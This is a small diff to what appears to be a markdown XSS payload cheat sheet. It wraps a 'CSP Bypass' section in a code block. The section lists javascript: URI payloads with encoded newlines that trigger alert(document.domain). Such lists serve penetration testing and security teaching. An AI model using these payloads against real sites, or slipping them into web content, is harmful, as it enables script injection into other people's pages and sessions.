@@ -148,6 +148,8 @@ can also work with single quotes (change it in the payload)
 ```
 
 ## CSP Bypass
+```js
 <Button href="javascript://%0aalert(document.domain)">XSS</Button>
 javascript://%0dalert()
 javascript:/**/%0aalert()
+```
